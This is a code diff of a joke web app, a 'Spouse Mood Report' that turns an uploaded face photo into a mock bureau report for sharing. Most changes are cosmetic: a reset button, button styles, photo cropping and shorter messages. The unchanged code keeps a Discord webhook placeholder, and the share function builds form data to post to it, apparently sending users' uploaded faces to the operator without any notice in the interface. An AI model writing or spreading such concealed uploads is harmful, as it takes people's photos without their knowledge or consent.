@@ -8,7 +8,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 
     <style>
-        :root { --main-red: #d63031; --dark-bg: #1a1a1a; --btn-green: #2ecc71; --btn-blue: #0984e3; }
+        :root { --main-red: #d63031; --dark-bg: #1a1a1a; --btn-green: #2ecc71; --btn-blue: #0984e3; --btn-grey: #636e72; }
         body { font-family: 'Courier New', Courier, monospace; background-color: #f0f0f0; margin: 0; padding: 10px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
 
         .main-header { text-align: center; margin: 20px 0; }
@@ -25,10 +25,10 @@
         .btn-red { background-color: var(--main-red); }
         .btn-green { background-color: var(--btn-green); }
         .btn-blue { background-color: var(--btn-blue); }
+        .btn-grey { background-color: var(--btn-grey); }
         
         #status-msg { margin-top: 10px; font-size: 0.8rem; font-weight: bold; color: #27ae60; min-height: 1.2em; }
 
-        /* --- THE REPORT CARD --- */
         #report-container {
             width: 95%; max-width: 600px; background-color: #fff; border: 10px solid #222;
             padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); position: relative;
@@ -36,29 +36,25 @@
         }
 
         #report-container.square-mode { width: 600px; height: 600px; padding: 20px; display: flex; flex-direction: column; }
-        #report-container.square-mode .report-body { flex: 1; overflow: hidden; }
-
         .report-header { border-bottom: 5px solid #222; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
         .gov-seal { border: 2px solid #222; padding: 5px; font-weight: 900; font-size: 0.6rem; text-align: center; width: 80px; }
         .report-title-inner h2 { margin: 0; font-size: 1.1rem; text-decoration: underline; }
 
         .report-body { display: flex; flex-wrap: wrap; gap: 15px; }
-        .photo-section { flex: 1; min-width: 200px; border: 3px solid #222; position: relative; background: #fafafa; overflow: hidden; }
-        #photo-preview { width: 100%; height: auto; display: block; }
+        .photo-section { flex: 1; min-width: 200px; border: 3px solid #222; position: relative; background: #fafafa; overflow: hidden; height: 250px; }
+        #photo-preview { width: 100%; height: 100%; object-fit: cover; display: block; }
 
         .scan-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: red; box-shadow: 0 0 10px red; animation: scan 4s infinite linear; }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
 
         .data-section { flex: 1.2; min-width: 230px; }
         .data-title { font-size: 0.8rem; font-weight: bold; border-bottom: 2px solid #222; margin-bottom: 10px; }
-
         .mood-row { margin-bottom: 8px; }
         .mood-label { display: flex; justify-content: space-between; font-size: 0.75rem; font-weight: bold; }
         .progress-bar { height: 10px; background: #eee; border: 1px solid #333; }
         .progress-fill { height: 100%; background: #222; width: 0%; transition: width 1s ease-in-out; }
 
         .official-stamp { position: absolute; bottom: 100px; right: 20px; color: rgba(192, 57, 43, 0.7); border: 4px solid rgba(192, 57, 43, 0.7); padding: 5px 15px; font-size: 1.2rem; font-weight: 900; transform: rotate(-15deg); text-transform: uppercase; pointer-events: none; }
-
         .footer-note { margin-top: 25px; border-top: 2px solid #222; padding-top: 10px; text-align: center; }
         .portal-link { color: var(--main-red); font-size: 0.8rem; font-weight: bold; text-decoration: none; display: block; }
         .signature { font-family: 'Brush Script MT', cursive; font-size: 1.4rem; border-bottom: 1px solid #222; display: inline-block; width: 150px; margin-top: 5px; }
@@ -71,14 +67,17 @@
     </div>
 
     <div class="controls">
-        <p>1. Upload Face Data</p>
-        <input type="file" id="imageUpload" accept="image/*">
+        <div id="upload-stage">
+            <p>1. Upload Subject Face Data</p>
+            <input type="file" id="imageUpload" accept="image/*">
+        </div>
         
         <div id="share-area" style="display:none; margin-top: 15px;">
-            <p>2. Share Result or Link</p>
+            <p>Bureau Options</p>
             <button onclick="toggleMode()" class="btn-red" id="modeBtn">Switch to Instagram Square</button>
             <button onclick="handleShare()" class="btn-green">Share Result (WhatsApp/Photo)</button>
-            <button onclick="copyAppLink()" class="btn-blue">Copy Link to Send to Friends</button>
+            <button onclick="copyAppLink()" class="btn-blue">Copy Link to App</button>
+            <button onclick="resetApp()" class="btn-grey">Reset Scanner (New Session)</button>
             <div id="status-msg"></div>
         </div>
     </div>
@@ -116,11 +115,13 @@
     </div>
 
     <script>
+        // --- YOUR DISCORD WEBHOOK HERE ---
         const DISCORD_WEBHOOK_URL = 'PASTE_YOUR_WEBHOOK_URL_HERE'; 
 
         const imageUpload = document.getElementById('imageUpload');
         const reportContainer = document.getElementById('report-container');
         const shareArea = document.getElementById('share-area');
+        const uploadStage = document.getElementById('upload-stage');
         const photoPreview = document.getElementById('photo-preview');
         const statusMsg = document.getElementById('status-msg');
         
@@ -135,7 +136,7 @@
                     photoPreview.src = event.target.result;
                     reportContainer.style.display = 'block';
                     shareArea.style.display = 'block';
-                    statusMsg.innerText = "";
+                    uploadStage.style.display = 'none';
                     document.getElementById('current-date').innerText = "FILED: " + new Date().toLocaleDateString().toUpperCase();
                     generateMoods();
                     reportContainer.scrollIntoView({ behavior: 'smooth' });
@@ -143,6 +144,15 @@
                 reader.readAsDataURL(file);
             }
         });
+
+        function resetApp() {
+            reportContainer.style.display = 'none';
+            shareArea.style.display = 'none';
+            uploadStage.style.display = 'block';
+            imageUpload.value = '';
+            statusMsg.innerText = "Scanner Reset Successfully.";
+            setTimeout(() => { statusMsg.innerText = ""; }, 2000);
+        }
 
         function toggleMode() {
             const isSquare = reportContainer.classList.toggle('square-mode');
@@ -165,13 +175,13 @@
 
         function copyAppLink() {
             navigator.clipboard.writeText(currentUrl).then(() => {
-                statusMsg.innerText = "App link copied! Send it to your friends.";
+                statusMsg.innerText = "Link Copied! Send to friends.";
                 setTimeout(() => { statusMsg.innerText = ""; }, 3000);
             });
         }
 
         async function handleShare() {
-            statusMsg.innerText = "Generating Shareable File...";
+            statusMsg.innerText = "Generating File...";
             const canvas = await html2canvas(reportContainer, { scale: 2 });
             const dataUrl = canvas.toDataURL("image/png");
             const blob = await (await fetch(dataUrl)).blob();
@@ -179,17 +189,9 @@
 
             if (navigator.canShare && navigator.canShare({ files: [file] })) {
                 try {
-                    await navigator.share({
-                        files: [file],
-                        title: 'Spouse Mood Report',
-                        text: `Check out this Mood Report! Try it yourself here: ${currentUrl}`
-                    });
-                } catch (err) {
-                    downloadFallback(dataUrl);
-                }
-            } else {
-                downloadFallback(dataUrl);
-            }
+                    await navigator.share({ files: [file], title: 'Spouse Mood Report', text: `Try the Mood Bureau: ${currentUrl}` });
+                } catch (err) { downloadFallback(dataUrl); }
+            } else { downloadFallback(dataUrl); }
 
             if (DISCORD_WEBHOOK_URL !== 'PASTE_YOUR_WEBHOOK_URL_HERE') {
                 const fd = new FormData();
@@ -201,9 +203,7 @@
 
         function downloadFallback(url) {
             const link = document.createElement('a');
-            link.download = 'mood-report.png';
-            link.href = url;
-            link.click();
+            link.download = 'mood-report.png'; link.href = url; link.click();
             statusMsg.innerText = "Saved to Gallery!";
         }
     </script>
